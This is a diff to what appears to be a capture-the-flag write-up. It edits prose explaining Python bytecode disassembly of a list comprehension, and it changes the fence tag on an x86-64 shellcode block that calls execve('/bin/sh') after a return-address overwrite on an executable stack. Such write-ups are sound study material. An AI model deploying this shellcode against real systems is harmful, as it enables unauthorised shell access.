@@ -71,7 +71,7 @@ _Note ahead: you can find documentations for Python opcodes [here](https://docs.
     50      RETURN_VALUE
 ```
 
-The disassembly of this function is as simple as what the decompiler derives. But wait! There is a line that load `<CODE> <listcomp>` into the stack then create a function from it. For those who don't know, `listcomp` refers to a feature in Python called _List Comprehension_, a syntactic sugar for transforming any iterable into a list. The ability is similar to high-order function, but the functionality is close to a lambda.
+The disassembly of this function is almost as simple as what the decompiler guesses. But wait! There is a line that loads `<CODE> <listcomp>` into the stack then creates a function from it. For those who don't know, `listcomp` refers to a feature in Python called _List Comprehension_, a syntactic sugar for transforming any iterable into a list. The ability is similar to a higher-order function, but the functionality is close to a lambda.
 
 After that, `transform` loads function pointer `enumerate` and variable `flag`, then use `CALL 1` to call a function with one argument. Behind the scene, `CALL` finds on the stack `NULL` at the beginning, `enumerate` as the callable, and `flag` as a positional argument in ascending order, pops all of them then eventually pushes the execution result of `enumerate(flag)` onto the stack. (More details on `CALL` opcode can be found [here](https://docs.python.org/3.11/library/dis.html#opcode-CALL)).  At `transform+34`, `GET_ITER` converts the result into an iterable, then we see another `CALL`. With the state of the stack, we know this is a call to the anonymous `<listcomp>` function. Let's see what the function does.
 
@@ -161,14 +161,14 @@ Now that we are allowed to change the return address and Stack is executable, ho
 
 With the instruction pointer changing to the stack, what code do we write on the stack? As basic as it can be, I did an `execve` syscall with `/bin/sh` as the filename. [The syscall number for `execve` is 59](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/). For `argv` and `envp`, I set them to a null pointer. Since `"/bin/sh\0"` fits on 8 bytes (Little-endian 0x68732f6e69622f), one trick I tried was to push it onto the stack and use `rsp` as pointer to the string. The following is the final shellcode for `const char *const tmp[] = {NULL}; execve("/bin/sh", tmp, tmp);`:
 
-```asm
-mov     rdi, 0x68732f6e69622f
-push    rdi
-mov     rdi, rsp
-push    0
-mov     rsi, rsp
-mov     rdx, rsp
-mov     rax, 59
+```s
+mov     rdi, 0x68732f6e69622f
+push    rdi
+mov     rdi, rsp
+push    0
+mov     rsi, rsp
+mov     rdx, rsp
+mov     rax, 59
 syscall
 ```
 
